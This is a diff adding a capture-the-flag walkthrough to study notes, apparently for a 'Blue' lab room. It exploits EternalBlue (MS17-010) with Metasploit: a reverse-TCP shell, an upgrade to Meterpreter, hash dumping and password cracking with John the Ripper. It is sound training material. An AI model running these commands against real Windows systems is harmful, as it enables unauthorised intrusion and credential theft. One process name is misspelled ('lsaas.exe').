@@ -3754,31 +3754,202 @@ creds_all
 
 ### Room 5 - Blue
 
+**Learning Objectives**
+- Practice exploiting EternalBlue (MS17-010)
+- Gain a shell and upgrade it to Meterpreter
+- Escalate privileges
+- Dump and crack password hashes
+- Locate flags on a Windows system
 
+---
 
+#### What is EternalBlue?
 
+**EternalBlue (MS17-010)** is a critical vulnerability in Microsoft’s SMBv1 protocol.  
 
+- Discovered by the NSA and later leaked by the Shadow Brokers in 2017  
+- Allows remote code execution  
+- Famously used in the WannaCry ransomware attack  
+- Affects unpatched Windows systems (especially Windows 7 and Server 2008 R2)
 
+---
 
+#### Exploitation Steps
 
+#### 1. Reconnaissance
 
+Scan the target (note: this machine does **not** respond to ICMP ping):
 
+```bash
+nmap -sV -p- --script=smb-vuln-ms17-010 <TARGET_IP>
+```
 
+You should see that the target is vulnerable to MS17-010.
 
+---
 
+#### 2. Gain Access with Metasploit
 
+```Bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <TARGET_IP>
+set payload windows/x64/shell/reverse_tcp
+set LHOST <YOUR_IP>
+run
+```
 
+You should receive a regular command shell.
 
+---
 
+#### 3. Escalate to Meterpreter
 
+Background the shell (Ctrl + Z), then upgrade it:
+```Bash
+use post/multi/manage/shell_to_meterpreter
+set SESSION <SESSION_ID>
+run
+```
 
+Then interact with the new Meterpreter session: 
+```Bash
+sessions -i <NEW_SESSION_ID>
+```
 
+Confirm you have SYSTEM privileges:
+```Bash
+getuid
+# Should return: NT AUTHORITY\SYSTEM
 
+getsystem   # (optional, usually already SYSTEM)
+```
 
+---
 
+#### 4. Migrate to a Stable Process
 
+```Bash
+ps
+```
+
+Find a process running as **NT AUTHORITY\SYSTEM** (preferably something stable like `spoolsv.exe` or `lsaas.exe`), then:
+```Bash
+migrate <PID>
+```
+
+---
+
+#### 5. Dump Password Hashes
+
+```Bash
+hashdump
+```
+
+Look for the non-default user hash and save it to a file.
+
+**Crack the hash** (using John the Ripper or Hashcat):
+```Bash
+john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+---
+
+#### 6. Find the Flags
+
+The three flags represent key locations on a Windows system:
+
+| Flag  | Typical Location | Hint                                        |
+| ----- | ---------------- | ------------------------------------------- |
+| flag1 | System root      | Usually on the Desktop or in C:\            |
+| flag2 | System directory | Often in C:\Windows\System32\config\        |
+| flag3 | User directory   | Inside a user’s Documents or Desktop folder |
+
+Use Meterpreter to search:
+```Bash
+search -f flag*.txt
+search -f *flag*
+```
+
+Or drop into a shell and manually explore:
+```Bash
+shell
+dir C:\
+dir C:\Windows\System32\config
+dir C:\Users
+```
+
+---
+
+#### Quick Command Reference
+
+| Goal                | Command                                      |
+| ------------------- | -------------------------------------------- |
+| Exploit EternalBlue | use exploit/windows/smb/ms17_010_eternalblue |
+| Upgrade shell       | use post/multi/manage/shell_to_meterpreter   |
+| Check privileges    | getuid                                       |
+| List processes      | ps                                           |
+| Migrate process     | migrate <PID>                                |
+| Dump hashes         | hashdump                                     |
+| Search for files    | search -f flag*.txt                          |
+
+---
+
+**End of Room 5**
 
 </details> <!-- Ends Room 5 -->
+
+---
+
+<details>
+<summary><strong>Room 6 - Attacktive Directory</strong></summary>
+
+### Room 6 - Attactive Directory
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</details> <!-- Ends Room 6 -->
 
 </details> <!-- End of Module 7 -->
 
